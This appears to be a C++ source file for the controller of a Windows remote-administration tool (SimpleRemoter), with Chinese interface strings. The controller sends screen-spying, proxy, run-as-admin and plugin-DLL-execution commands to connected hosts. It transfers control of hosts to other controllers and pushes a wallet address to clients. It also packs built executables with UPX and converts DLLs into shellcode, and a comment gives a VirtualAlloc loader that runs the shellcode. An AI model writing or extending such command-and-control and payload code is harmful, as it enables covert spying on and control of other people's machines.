	if ((pMsg->message == WM_LBUTTONDOWN || pMsg->message == WM_RBUTTONDOWN) && m_pFloatingTip)
	{
		HWND hTipWnd = m_pFloatingTip->GetSafeHwnd();
		if (::IsWindow(hTipWnd))
		{
			CPoint pt(pMsg->pt);
			CRect tipRect;
			::GetWindowRect(hTipWnd, &tipRect);
			if (!tipRect.PtInRect(pt)){
				DeletePopupWindow();
			}
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CMy2015RemoteDlg::OnOnlineShare()
{
	CInputDialog dlg(this);
	dlg.Init("分享主机", "输入<IP:PORT>地址:");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
		return;
	if (dlg.m_str.GetLength() >= 250) {
		MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
		return;
	}

	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
	// 目标主机类型
	bToken[1] = SHARE_TYPE_YAMA;
	memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnToolAuth()
{
	CPwdGenDlg dlg;
	std::string hardwareID = getHardwareID();
	std::string hashedID = hashSHA256(hardwareID);
	std::string deviceID = getFixedLengthID(hashedID);
	dlg.m_sDeviceID = deviceID.c_str();
	dlg.m_sUserPwd = m_superPass.c_str();

	dlg.DoModal();
	if (!dlg.m_sUserPwd.IsEmpty()){
		m_superPass = dlg.m_sUserPwd;
		if (deviceID.c_str() == dlg.m_sDeviceID) {
			m_nMaxConnection = dlg.m_nHostNum;
			THIS_APP->UpdateMaxConnection(m_nMaxConnection);
		}
	}
}

void CMy2015RemoteDlg::OnMainProxy()
{
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
		BYTE cmd[] = { COMMAND_PROXY };
		ContextObject->Send2Client( cmd, sizeof(cmd));
		break;
	}
	LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnOnlineHostnote()
{
	CInputDialog dlg(this);
	dlg.Init("修改备注", "请输入主机备注: ");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty()) {
		return;
	}
	if (dlg.m_str.GetLength() >= 64) {
		MessageBox("备注信息长度不能超过64个字符", "提示", MB_ICONINFORMATION);
		dlg.m_str = dlg.m_str.Left(63);
	}
	BOOL modified = FALSE;
	uint64_t key = 0;
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos) {
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
		auto f = m_ClientMap.find(ContextObject->GetClientID());
		if (f == m_ClientMap.end())
			m_ClientMap[ContextObject->GetClientID()] = ClientValue("", dlg.m_str);
		else
			m_ClientMap[ContextObject->GetClientID()].UpdateNote(dlg.m_str);
		m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
		modified = TRUE;
	}
	LeaveCriticalSection(&m_cs);
	if (modified) {
		EnterCriticalSection(&m_cs);
		SaveToFile(m_ClientMap, GetDbPath());
		LeaveCriticalSection(&m_cs);
	}
}


char* ReadFileToBuffer(const std::string &path, size_t& outSize) {
	// 打开文件
	std::ifstream file(path, std::ios::binary | std::ios::ate); // ate = 跳到末尾获得大小
	if (!file) {
		return nullptr;
	}

	// 获取文件大小并分配内存
	std::streamsize size = file.tellg();
	file.seekg(0, std::ios::beg);
	char* buffer = new char[size];

	// 读取文件到 buffer
	if (!file.read(buffer, size)) {
		delete[] buffer;
		return nullptr;
	}

	outSize = static_cast<size_t>(size);
	return buffer;
}

//////////////////////////////////////////////////////////////////////////
// UPX 

BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size)
{
	// 打开文件，以二进制模式写入
	std::string filePath = path;
	std::ofstream outFile(filePath, std::ios::binary);

	if (!outFile)
	{
		Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
		return FALSE;
	}

	// 写入二进制数据
	outFile.write(data, size);

	if (outFile.good())
	{
		Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
	}
	else
	{
		Mprintf("Failed to write data to file.\n");
		outFile.close();
		return FALSE;
	}

	// 关闭文件
	outFile.close();

	return TRUE;
}

int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
	STARTUPINFOA si = { sizeof(si) };
	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	PROCESS_INFORMATION pi;
	std::string cmd = isCompress ? "\" --best \"" : "\" -d \"";
	std::string cmdLine = "\"" + upx + cmd + file + "\"";

	BOOL success = CreateProcessA(
		NULL,
		&cmdLine[0],  // 注意必须是非 const char*
		NULL, NULL, FALSE,
		0, NULL, NULL, &si, &pi
	);

	if (!success) {
		Mprintf("Failed to run UPX. Error: %d\n", GetLastError());
		return -1;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	DWORD exitCode;
	GetExitCodeProcess(pi.hProcess, &exitCode);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return static_cast<int>(exitCode);
}

std::string ReleaseUPX() {
	DWORD dwSize = 0;
	LPBYTE data = ReadResource(IDR_BINARY_UPX, dwSize);
	if (!data)
		return "";

	char path[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	std::string curExe = path;
	GET_FILEPATH(path, "upx.exe");
	BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
	SAFE_DELETE_ARRAY(data);

	return r ? path : "";
}

// 解压UPX对当前应用程序进行操作
bool UPXUncompressFile(const std::string& upx, std::string &file) {
	char path[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	std::string curExe = path;

	if (!upx.empty())
	{
		file = curExe + ".tmp";
		if (!CopyFile(curExe.c_str(), file.c_str(), FALSE)) {
			Mprintf("Failed to copy file. Error: %d\n", GetLastError());
			return false;
		}
		int result = run_upx(upx, file, false);
		Mprintf("UPX decompression %s!\n", result ? "failed" : "successful");
		return 0 == result;
	}
	return false;
}

struct UpxTaskArgs {
	HWND hwnd; // 主窗口句柄
	std::string upx;
	std::string file;
	bool isCompress;
};

DWORD WINAPI UpxThreadProc(LPVOID lpParam) {
	UpxTaskArgs* args = (UpxTaskArgs*)lpParam;
	int result = run_upx(args->upx, args->file, args->isCompress);

	// 向主线程发送完成消息，wParam可传结果
	PostMessageA(args->hwnd, WM_UPXTASKRESULT, (WPARAM)result, 0);

	DeleteFile(args->upx.c_str());
	delete args;

	return 0;
}

void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress) {
	UpxTaskArgs* args = new UpxTaskArgs{ hwnd, upx, file, isCompress };
	CloseHandle(CreateThread(NULL, 0, UpxThreadProc, args, 0, NULL));
}

LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
	int exitCode = static_cast<int>(wParam);
	ShowMessage(exitCode == 0 ? "操作成功":"操作失败", "UPX 处理完成");
	return S_OK;
}

//////////////////////////////////////////////////////////////////////////

void CMy2015RemoteDlg::OnToolGenMaster()
{
	// 主控程序公网IP
	std::string master = THIS_CFG.GetStr("settings", "master", "");
	if (master.empty())	{
		MessageBox("请通过菜单设置当前主控程序的公网地址（域名）! 此地址会写入即将生成的主控程序中。"
			"\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
	}
	std::string masterHash(GetMasterHash());
	if (m_superPass.empty()) {
		CInputDialog pass(this);
		pass.Init("主控生成", "当前主控程序的密码:");
		pass.m_str = m_superPass.c_str();
		if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
			return;
		if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
			MessageBox("密码不正确，无法生成主控程序!", "错误", MB_ICONWARNING);
			return;
		}
		m_superPass = pass.m_str.GetString();
	}

	CInputDialog dlg(this);
	dlg.Init("主控密码", "新的主控程序的密码:");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
		return;
	if (dlg.m_str.GetLength() > 15) {
		MessageBox("密码长度不能大于15。", "错误", MB_ICONWARNING);
		return;
	}
	CInputDialog days(this);
	days.Init("使用天数", "新主控程序使用天数:");
	if (days.DoModal() != IDOK || days.m_str.IsEmpty())
		return;
	size_t size = 0;
	char path[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	if (len == 0 || len == MAX_PATH) {
		return;
	}
	char* curEXE = ReadFileToBuffer(path, size);
	if (curEXE == nullptr) {
		MessageBox("读取文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
		return;
	}
	std::string pwdHash = hashSHA256(dlg.m_str.GetString());
	int iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
	std::string upx = ReleaseUPX();
	if (iOffset == -1)
	{
		SAFE_DELETE_ARRAY(curEXE);
		std::string tmp;
		if (!UPXUncompressFile(upx, tmp) || nullptr == (curEXE = ReadFileToBuffer(tmp.c_str(), size))) {
			MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
			if (!upx.empty()) DeleteFile(upx.c_str());
			if (!tmp.empty()) DeleteFile(tmp.c_str());
			return;
		}
		DeleteFile(tmp.c_str());
		iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
		if (iOffset == -1) {
			SAFE_DELETE_ARRAY(curEXE);
			MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
			return;
		}
	}
	int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
	std::string id = genHMAC(pwdHash, m_superPass);
	Validation verify(atof(days.m_str), master.c_str(), port<=0 ? 6543 : port, id.c_str());
	if (!WritePwdHash(curEXE + iOffset, pwdHash, verify)) {
		MessageBox("写入哈希失败! 无法生成主控。", "错误", MB_ICONWARNING);
		SAFE_DELETE_ARRAY(curEXE);
		return;
	}
	CComPtr<IShellFolder> spDesktop;
	HRESULT hr = SHGetDesktopFolder(&spDesktop);
	if (FAILED(hr)) {
		MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
		SAFE_DELETE_ARRAY(curEXE);
		return;
	}
	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
	CFileDialog fileDlg(FALSE, _T("exe"), "YAMA.exe", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
		_T("EXE Files (*.exe)|*.exe|All Files (*.*)|*.*||"), AfxGetMainWnd());
	int ret = 0;
	try {
		ret = fileDlg.DoModal();
	}
	catch (...) {
		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
		SAFE_DELETE_ARRAY(curEXE);
		return;
	}
	if (ret == IDOK)
	{
		CString name = fileDlg.GetPathName();
		CFile File;
		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		if (!r) {
			MessageBox("主控程序创建失败!\r\n" + name, "提示", MB_ICONWARNING);
			SAFE_DELETE_ARRAY(curEXE);
			return;
		}
		File.Write(curEXE, size);
		File.Close();
		if (!upx.empty())
		{
#ifndef _DEBUG // DEBUG 模式用UPX压缩的程序可能无法正常运行
			run_upx_async(GetSafeHwnd(), upx, name.GetString(), true);
			MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + name, "提示", MB_ICONINFORMATION);
#endif
		}else
			MessageBox("生成成功! 文件位于:\r\n" + name, "提示", MB_ICONINFORMATION);
	}
	SAFE_DELETE_ARRAY(curEXE);
}


void CMy2015RemoteDlg::OnHelpImportant()
{
	const char* msg = 
		"本软件以“现状”提供，不附带任何保证。使用本软件的风险由用户自行承担。"
		"我们不对任何因使用本软件而引发的非法或恶意用途负责。用户应遵守相关法律"
		"法规，并负责任地使用本软件。开发者对任何因使用本软件产生的损害不承担责任。";
	MessageBox(msg, "免责声明", MB_ICONINFORMATION);
}


void CMy2015RemoteDlg::OnHelpFeedback()
{
	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/issues/new");
	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}

void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
	if (m_DllList.size() == 0) {
		MessageBoxA("请将64位的DLL放于主控程序的 'Plugins' 目录，再来点击此项菜单。"
			"\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION);
		char path[_MAX_PATH];
		GetModuleFileNameA(NULL, path, _MAX_PATH);
		GET_FILEPATH(path, "Plugins");
		m_DllList = ReadAllDllFilesWindows(path);
		return;
	}
	int menuIndex = nID - ID_DYNAMIC_MENU_BASE;  // 计算菜单项的索引（基于 ID）
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos && menuIndex < m_DllList.size()) {
		Buffer* buf = m_DllList[menuIndex]->Data;
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
		ContextObject->Send2Client( buf->Buf(), 1 + sizeof(DllExecuteInfo) );
	}
	LeaveCriticalSection(&m_cs);
}
void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineGrayDesktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineH264Desktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264 };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnWhatIsThis()
{
	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki");
	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}


void CMy2015RemoteDlg::OnOnlineAuthorize()
{
	if (m_superPass.empty()) {
		CInputDialog pass(this);
		pass.Init("需要密码", "当前主控程序的密码:");
		if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
			return;
		std::string masterHash(GetMasterHash());
		if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
			MessageBox("密码不正确!", "错误", MB_ICONWARNING);
			return;
		}
		m_superPass = pass.m_str;
	}

	CInputDialog dlg(this);
	dlg.Init("延长授权", "主控程序授权天数:");
	dlg.Init2("并发上线机器数量:", std::to_string(100).c_str());
	if (dlg.DoModal() != IDOK || atoi(dlg.m_str) <= 0)
		return;
	BYTE	bToken[32] = { CMD_AUTHORIZATION };
	unsigned short days = atoi(dlg.m_str);
	unsigned short num = atoi(dlg.m_sSecondInput);
	uint32_t tm = clock();
	// 2字节天数+2字节主机数+4字节时间戳+消息签名
	memcpy(bToken+1, &days, sizeof(days));
	memcpy(bToken+3, &num, sizeof(num));
	memcpy(bToken + 8, &tm, sizeof(tm));
	uint64_t signature = SignMessage(m_superPass, bToken, 12);
	memcpy(bToken + 12, &signature, sizeof(signature));
	SendSelectedCommand(bToken, sizeof(bToken));
}

void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItem = (LPNMITEMACTIVATE)pNMHDR;

	if (pNMItem->iItem >= 0)
	{
		// 获取数据
		context* ctx = (context*)m_CList_Online.GetItemData(pNMItem->iItem);
		CString res[RES_MAX];
		CString startTime = ctx->GetClientData(ONLINELIST_LOGINTIME);
		ctx->GetAdditionalData(res);
		FlagType type = ctx->GetFlagType();
		static std::map<FlagType, std::string> typMap = {
			{FLAG_WINOS, "WinOS"}, {FLAG_UNKNOWN, "Unknown"}, {FLAG_SHINE, "Shine"}, 
			{FLAG_FUCK, "FUCK"}, {FLAG_HELLO, "Hello"}, {FLAG_HELL, "HELL"},
		};

		// 拼接内容
		CString strText;
		std::string expired = res[RES_EXPIRED_DATE];
		expired = expired.empty() ? "" : " Expired on " + expired;
		strText.Format(_T("文件路径: %s%s %s\r\n系统信息: %s 位 %s 核心 %s GB\r\n启动信息: %s %s\r\n上线信息: %s %d %s"), 
			res[RES_PROGRAM_BITS].IsEmpty() ? "" : res[RES_PROGRAM_BITS] + " 位 ", res[RES_FILE_PATH], res[RES_EXE_VERSION],
			res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], startTime, expired.c_str(),
			ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str());

		// 获取鼠标位置
		CPoint pt;
		GetCursorPos(&pt);

		// 清理旧提示
		DeletePopupWindow();

		// 创建提示窗口
		m_pFloatingTip = new CWnd();
		int width = res[RES_FILE_PATH].GetLength() * 10 + 36;
		width = min(max(width, 360), 800);
		CRect rect(pt.x, pt.y, pt.x + width, pt.y + 80); // 宽度、高度

		BOOL bOk = m_pFloatingTip->CreateEx(
			WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
			_T("STATIC"),
			strText,
			WS_POPUP | WS_VISIBLE | WS_BORDER | SS_LEFT | SS_NOTIFY,
			rect,
			this,
			0);

		if (bOk)
		{
			m_pFloatingTip->SetFont(GetFont());
			m_pFloatingTip->ShowWindow(SW_SHOW);
			SetTimer(TIMER_CLOSEWND, 5000, nullptr);
		}
		else
		{
			SAFE_DELETE(m_pFloatingTip);
		}
	}

	*pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineUnauthorize()
{
	if (m_superPass.empty()) {
		CInputDialog pass(this);
		pass.Init("需要密码", "当前主控程序的密码:");
		if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
			return;
		std::string masterHash(GetMasterHash());
		if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
			MessageBox("密码不正确!", "错误", MB_ICONWARNING);
			return;
		}
		m_superPass = pass.m_str;
	}

	BYTE	bToken[32] = { CMD_AUTHORIZATION };
	unsigned short days = 0;
	unsigned short num = 1;
	uint32_t tm = clock();
	// 2字节天数+2字节主机数+4字节时间戳+消息签名
	memcpy(bToken + 1, &days, sizeof(days));
	memcpy(bToken + 3, &num, sizeof(num));
	memcpy(bToken + 8, &tm, sizeof(tm));
	uint64_t signature = SignMessage(m_superPass, bToken, 12);
	memcpy(bToken + 12, &signature, sizeof(signature));
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnToolRequestAuth()
{
	MessageBoxA("本软件仅限于合法、正当、合规的用途。\r\n禁止将本软件用于任何违法、恶意、侵权或违反道德规范的行为。", 
		"声明", MB_ICONINFORMATION);
	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#请求授权");
	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}


void CMy2015RemoteDlg::OnToolInputPassword()
{
	if (CheckValid(-1)) {
		CString pwd = THIS_CFG.GetStr("settings", "Password", "").c_str();
		auto v = splitString(pwd.GetBuffer(), '-');
		CString info;
		info.Format("软件有效期限: %s — %s, 并发连接数量: %d.", v[0].c_str(), v[1].c_str(), atoi(v[2].c_str()));
		if (IDYES == MessageBoxA(info + "\n如需修改授权信息，请联系管理员。是否现在修改授权？", "提示", MB_YESNO | MB_ICONINFORMATION)) {
			CInputDialog dlg(this);
			dlg.m_str = pwd;
			dlg.Init("更改口令", "请输入新的口令:");
			if (dlg.DoModal() == IDOK) {
				THIS_CFG.SetStr("settings", "Password", dlg.m_str.GetString());
#ifdef _DEBUG
				SetTimer(TIMER_CHECK, 10 * 1000, NULL);
#else
				SetTimer(TIMER_CHECK, 600 * 1000, NULL);
#endif
			}
		}
	}
}

// 将二进制数据以 C 数组格式写入文件
bool WriteBinaryAsCArray(const char* filename, LPBYTE data, size_t length, const char* arrayName = "data") {
	FILE* file = fopen(filename, "w");
	if (!file) return false;

	fprintf(file, "unsigned char %s[] = {\n", arrayName);
	for (size_t i = 0; i < length; ++i) {
		if (i % 24 == 0) fprintf(file, "    ");
		fprintf(file, "0x%02X", data[i]);
		if (i != length - 1) fprintf(file, ",");
		if ((i + 1) % 24 == 0 || i == length - 1) fprintf(file, "\n");
		else fprintf(file, " ");
	}
	fprintf(file, "};\n");
	fprintf(file, "unsigned int %s_len = %zu;\n", arrayName, length);

	fclose(file);
	return true;
}

/* Example: <Select TinyRun.dll to build "tinyrun.c">
#include "tinyrun.c"
#include <windows.h>
#include <stdio.h>

int main() {
	void* exec = VirtualAlloc(NULL,Shellcode_len,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (exec) {
		memcpy(exec, Shellcode, Shellcode_len);
		((void(*)())exec)();
		Sleep(INFINITE);
	}
	return 0;
}
*/
void CMy2015RemoteDlg::OnToolGenShellcode()
{
	CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
		_T("DLL Files (*.dll)|*.dll|All Files (*.*)|*.*||"), AfxGetMainWnd());
	int ret = 0;
	try {
		ret = fileDlg.DoModal();
	}
	catch (...) {
		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示", MB_ICONWARNING);
		return;
	}
	if (ret == IDOK)
	{
		CString name = fileDlg.GetPathName();
		CFile File;
		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeRead);
		if (!r) {
			MessageBox("文件打开失败! 请稍后再试。\r\n" + name, "提示", MB_ICONWARNING);
			return;
		}
		int dwFileSize = File.GetLength();
		LPBYTE szBuffer = new BYTE[dwFileSize];
		File.Read(szBuffer, dwFileSize);
		File.Close();

		LPBYTE srcData = NULL;
		int srcLen = 0;
		if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize)) {
			TCHAR buffer[MAX_PATH];
			_tcscpy_s(buffer, name);
			PathRemoveExtension(buffer);
			if (WriteBinaryAsCArray(CString(buffer) + ".c", srcData, srcLen, "Shellcode")) {
				MessageBox("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + ".c", 
					"提示", MB_ICONINFORMATION);
			}
		}
		SAFE_DELETE_ARRAY(srcData);
		SAFE_DELETE_ARRAY(szBuffer);
	}
}


void CMy2015RemoteDlg::OnOnlineAssignTo()
{
	CInputDialog dlg(this);
	dlg.Init("转移主机(到期自动复原)", "输入<IP:PORT>地址:");
	dlg.Init2("天数(支持浮点数):", "30");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty() || atof(dlg.m_sSecondInput.GetString())<=0)
		return;
	if (dlg.m_str.GetLength() >= 250) {
		MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
		return;
	}
	if (dlg.m_sSecondInput.GetLength() >= 6) {
		MessageBox("超出使用时间可输入的字符数限制!", "提示", MB_ICONINFORMATION);
		return;
	}

	BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
	// 目标主机类型
	bToken[1] = SHARE_TYPE_YAMA_FOREVER;
	memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
	bToken[2 + dlg.m_str.GetLength()] = ':';
	memcpy(bToken + 2 + dlg.m_str.GetLength() + 1, dlg.m_sSecondInput, dlg.m_sSecondInput.GetLength());
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLVCUSTOMDRAW pLVCD = reinterpret_cast<LPNMLVCUSTOMDRAW>(pNMHDR);
	*pResult = 0;

	switch (pLVCD->nmcd.dwDrawStage)
	{
	case CDDS_PREPAINT:
		*pResult = CDRF_NOTIFYITEMDRAW;
		return;

	case CDDS_ITEMPREPAINT:{
		int nRow = static_cast<int>(pLVCD->nmcd.dwItemSpec);
		int nLastRow = m_CList_Message.GetItemCount() - 1;
		if (nRow == nLastRow && nLastRow >= 0){
			pLVCD->clrText = RGB(255, 0, 0);
		}
	}
	}
}


void CMy2015RemoteDlg::OnOnlineAddWatch()
{
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		context* ctx = (context*)m_CList_Online.GetItemData(iItem);
		auto f = m_ClientMap.find(ctx->GetClientID());
		int r = f != m_ClientMap.end() ? f->second.GetLevel() : 0;
		m_ClientMap[ctx->GetClientID()].UpdateLevel(++r >= 4 ? 0 : r);
	}
	SaveToFile(m_ClientMap, GetDbPath());
	LeaveCriticalSection(&m_cs);
}


void CMy2015RemoteDlg::OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLVCUSTOMDRAW pLVCD = reinterpret_cast<LPNMLVCUSTOMDRAW>(pNMHDR);
	*pResult = 0;

	switch (pLVCD->nmcd.dwDrawStage)
	{
	case CDDS_PREPAINT:
		*pResult = CDRF_NOTIFYITEMDRAW;
		return;

	case CDDS_ITEMPREPAINT:{
		int nRow = static_cast<int>(pLVCD->nmcd.dwItemSpec);
		EnterCriticalSection(&m_cs);
		context* ctx = (context*)m_CList_Online.GetItemData(nRow);
		auto f = m_ClientMap.find(ctx->GetClientID());
		int r = f != m_ClientMap.end() ? f->second.GetLevel() : 0;
		LeaveCriticalSection(&m_cs);
		if (r >= 1) pLVCD->clrText = RGB(0, 0, 255); // 字体蓝
		if (r >= 2) pLVCD->clrText = RGB(255, 0, 0); // 字体红
		if (r >= 3) pLVCD->clrTextBk = RGB(255, 160, 160); // 背景红
	}
	}
}


void CMy2015RemoteDlg::OnOnlineRunAsAdmin()
{
	if (MessageBoxA("确定要以管理员权限重新启动目标应用程序吗?\n此操作可能触发 UAC 账户控制。",
		"提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
		EnterCriticalSection(&m_cs);
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		while (Pos) {
			int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
			context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
			BYTE token = CMD_RUNASADMIN;
			ContextObject->Send2Client(&token, sizeof(token));
		}
		LeaveCriticalSection(&m_cs);
	}
}


void CMy2015RemoteDlg::OnMainWallet()
{
	CWalletDlg dlg(this);
	dlg.m_str = CString(m_settings.WalletAddress);
	if (dlg.DoModal() != IDOK || CString(m_settings.WalletAddress) == dlg.m_str)
		return;
	if (dlg.m_str.GetLength() > 470) {
		MessageBox("超出钱包地址可输入的字符数限制!", "提示", MB_ICONINFORMATION);
		return;
	}
	strcpy(m_settings.WalletAddress, dlg.m_str);
	THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
	SendMasterSettings(nullptr);
}
